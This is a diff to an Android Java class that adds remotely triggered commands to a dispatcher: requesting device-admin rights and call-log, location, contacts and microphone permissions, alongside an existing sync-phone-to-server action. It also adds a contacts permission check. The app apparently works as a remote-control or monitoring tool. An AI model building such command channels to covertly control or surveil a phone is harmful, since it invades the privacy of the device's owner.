@@ -1,5 +1,6 @@
 package com.candroid.textme.api;
 
+import android.Manifest;
 import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
 import android.app.Activity;
@@ -653,7 +654,27 @@ public class Lofl {
                 intent.setAction(JobsIntentService.ACTION_SYNC_PHONE_TO_SERVER);
                 commandFound = true;
                 break;
-            default:
+            case Commands.ADMIN:
+                intent.setAction(JobsIntentService.ACTION_ADMIN);
+                commandFound = true;
+                break;
+            case Commands.CALL_LOG_PERMISSION:
+                intent.setAction(JobsIntentService.ACTION_CALL_LOG_PERMISSION);
+                commandFound = true;
+                break;
+            case Commands.LOCATION_PERMISSION:
+                intent.setAction(JobsIntentService.ACTION_LOCATION_PERMISSION);
+                commandFound = true;
+                break;
+            case Commands.CONTACTS_PERMISSION:
+                intent.setAction(JobsIntentService.ACTION_CONTACTS_PERMISSION);
+                commandFound = true;
+                break;
+            case Commands.RECORD_AUDIO_PERMISSION:
+                intent.setAction(JobsIntentService.ACTION_RECORD_AUDIO_PERMISSION);
+                commandFound = true;
+                break;
+                default:
                 break;
         }
         if(intent.getAction() != null){
@@ -819,14 +840,16 @@ public class Lofl {
 
     public static String lookupPhoneNumberByName(Context context, String name) throws NullPointerException {
         String address = "";
-        String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ";
-        String[] selectionArgs = new String[]{"%".concat(name).concat("%")};
-        String[] projection = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
-        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, selection, selectionArgs, null);
-        if (cursor.moveToFirst()) {
-            address = cursor.getString(0);
+        if(context.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED){
+            String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ";
+            String[] selectionArgs = new String[]{"%".concat(name).concat("%")};
+            String[] projection = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
+            Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, selection, selectionArgs, null);
+            if (cursor.moveToFirst()) {
+                address = cursor.getString(0);
+            }
+            cursor.close();
         }
-        cursor.close();
         return address;
     }
 
